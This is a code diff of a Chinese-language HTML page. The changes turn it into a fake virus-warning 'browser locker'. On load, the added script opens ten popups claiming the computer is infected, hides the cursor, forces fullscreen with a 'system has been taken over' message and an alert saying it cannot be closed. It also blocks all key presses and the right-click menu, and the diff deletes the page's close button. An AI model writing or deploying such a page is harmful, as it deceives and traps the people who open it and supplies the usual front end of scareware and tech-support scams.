@@ -5,39 +5,70 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>危险警告</title>
     <style>
+        * {
+            cursor: none !important;
+        }
         body {
             text-align: center;
             font-family: Arial, sans-serif;
             background-color: black;
             color: red;
+            overflow: hidden;
         }
         .warning {
-            font-size: 2em;
+            font-size: 5em;
             margin-top: 20%;
+            animation: shake 0.5s infinite alternate, flicker 1s infinite alternate;
         }
-        .close-btn {
-            padding: 10px 20px;
-            font-size: 1.5em;
-            margin-top: 20px;
-            cursor: pointer;
-            background-color: red;
-            color: white;
-            border: none;
+        @keyframes shake {
+            0% { transform: translateX(-10px); }
+            100% { transform: translateX(10px); }
+        }
+        @keyframes flicker {
+            0% { opacity: 1; }
+            100% { opacity: 0.3; }
         }
     </style>
     <script>
         function openPopups() {
-            for (let i = 0; i < 5; i++) {
-                window.open("popup.html", "", "width=400,height=300");
+            for (let i = 0; i < 10; i++) {
+                let popup = window.open("", "", "width=400,height=300");
+                if (popup) {
+                    popup.document.write("<h1 style='color:red;text-align:center;font-size:3em;'>⚠️ 你中病毒了！⚠️</h1>");
+                    popup.document.body.style.backgroundColor = "black";
+                    popup.document.body.style.color = "red";
+                    popup.document.body.style.fontFamily = "Arial, sans-serif";
+                    popup.document.body.style.cursor = "none";
+                }
             }
         }
-        function closeWindows() {
-            window.open("", "_self", "").close();
+
+        function goFullscreen() {
+            document.documentElement.requestFullscreen();
+            document.body.style.backgroundColor = "black";
+            document.body.innerHTML = "<h1 class='warning'>💀 系统已被控制 💀</h1>";
+            setTimeout(() => {
+                alert("无法关闭，请联系管理员。");
+            }, 2000);
         }
+
+        function preventExit() {
+            document.addEventListener("keydown", function (event) {
+                event.preventDefault();
+            });
+            document.addEventListener("contextmenu", function (event) {
+                event.preventDefault();
+            });
+        }
+
+        window.onload = function () {
+            openPopups();
+            setTimeout(goFullscreen, 3000);
+            preventExit();
+        };
     </script>
 </head>
-<body onload="openPopups()">
+<body>
     <div class="warning">⚠️ 你的电脑已被感染！ ⚠️</div>
-    <button class="close-btn" onclick="closeWindows()">关闭所有窗口</button>
 </body>
 </html>
